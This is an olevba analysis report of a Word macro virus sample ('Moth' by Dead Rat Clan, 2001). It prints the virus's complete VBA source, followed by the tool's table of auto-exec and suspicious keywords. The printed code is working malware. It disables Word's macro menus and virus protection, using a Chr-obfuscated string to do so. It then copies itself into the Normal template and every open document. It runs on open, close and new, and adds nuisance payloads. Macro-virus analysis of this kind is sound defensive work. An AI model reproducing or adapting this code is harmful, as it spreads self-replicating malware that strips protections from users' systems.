olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Clan-190b4c6bd2b6a7e85c5cc853c8c61b26a0adc642
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MothD.cls 
in file: Virus.MSWord.Clan-190b4c6bd2b6a7e85c5cc853c8c61b26a0adc642 - OLE stream: 'Macros/VBA/MothD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
CommandBars("Macro").Enabled = False
CommandBars("Visual basic").Enabled = False
a$ = Chr$(70): b$ = Chr$(97): c$ = Chr$(108): d$ = Chr$(115): e$ = Chr$(101): setings$ = a$ + b$ + c$ + d$ + e$
Application.Options.VirusProtection = setings$
Set M01 = ActiveDocument.VBProject.VBComponents.Item(1)
Set M02 = NormalTemplate.VBProject.VBComponents.Item(1)
M03 = M02.CodeModule.CountOfLines
M04 = M01.CodeModule.CountOfLines
M05 = Application.Documents.Count
If M03 > 0 Then
If M02.Name <> "MothN" Then
M02.CodeModule.DeleteLines 1, M03
End If
End If
If M03 = 0 Then
M02.CodeModule.InsertLines 1, M01.CodeModule.Lines(1, M04)
End If
If M02.Name <> "MothN" Then
M02.Name = "MothN"
a$ = Chr(34)
For dny = 1 To 9
If dny = 1 Then doble = "Sub AutoNew()"
If dny = 2 Then doble = "Document_Open"
If dny = 3 Then doble = "End Sub"
If dny = 4 Then doble = "Sub ViewVBCode()"
If dny = 5 Then doble = "MsgBox " + a$ + "It's Moth" + a$ + ", vbOKOnly," + a$ + "No Bom-Bom, no Kiss-Kiss!" + a$
If dny = 6 Then doble = "End Sub"
If dny = 7 Then doble = "Sub ToolsMacro()"
If dny = 8 Then doble = "MsgBox " + a$ + "It's Moth" + a$ + ", vbOKOnly," + a$ + "No Bom-Bom, no Kiss-Kiss!" + a$
If dny = 9 Then doble = "End Sub"
M02.CodeModule.InsertLines dny, doble
Next dny
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For infect = 1 To M05
If M01.Name <> "MothD" And M04 > 0 Then
Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
End If
If Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, M02.CodeModule.Lines(10, M03)
End If
Next infect
If M01.Name <> "MothD" Then M01.Name = "MothD"
'Copyright by Inquisitor
'   -=Dead Rat Clan=-
'  Mensk  2001  v.1.8
'Virus name: Moth
a = WeekDay((Now), vbMonday)
If a = 1 And Hour(Now) >= 17 Then
gamername = InputBox("What is you name ?")
If gamername = "Inquisitor" Or gamername = "Inq" Then
Mesg = "Hello boss! :-)": St = vbOKOnly + vbInformation + vbSystemModal
RoR = MsgBox(Mesg, St)
Else
Mesg = gamername + "it is time finish work ?": St = vbYesNo + vbCritical + vbSystemModal
RoR = MsgBox(Mesg, St)
If RoR = 6 Then
Set wrd = GetObject(, "Word.Application")
wrd.Visible = False
End If
End If
End If
If Second(Now) = Day(Now) Then
For amo = 0 To 50
ActiveDocument.Shapes.AddShape(msoShapeOval, 142#, 142#, 276.9, 170.4).Select
Selection.ShapeRange.Line.ForeColor.RGB = RGB(51, 204, 204)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.ForeColor.RGB = RGB(255, 204, 0)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(153, 204, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 128, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 51, 51)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 204, 153)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(150, 150, 150)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(150, 150, 150)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 51, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 153, 102)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 255, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Line.ForeColor.RGB = RGB(204, 255, 255)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.ForeColor.RGB = RGB(51, 51, 0)
Selection.ShapeRange.Line.Visible = msoTrue
Next amo
End If
If Day(Now) = 1 And Month(Now) = 5 Then
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, "Happy birthday Dead RAT Clan !!!", "Impact", 28#, msoTrue, msoFalse, 136.75, 201.2).Select
End If
If Day(Now) = Month(Now) Then
Selection.TypeText Text:="Dead RAT is BEST!"
Selection.MoveLeft Unit:=wdCharacter, Count:=21, Extend:=wdExtend
Selection.Font.Bold = wdToggle
Selection.Font.Size = 20
Selection.Font.ColorIndex = wdRed
Selection.MoveLeft Unit:=wdCharacter, Count:=4
Selection.Font.ColorIndex = wdBlue
Selection.InsertSymbol Font:="Monotype Sorts", CharacterNumber:=-4054, Unicode:=True
End If
End Sub
Private Sub Document_Close()
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Exit()
Document_Open
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

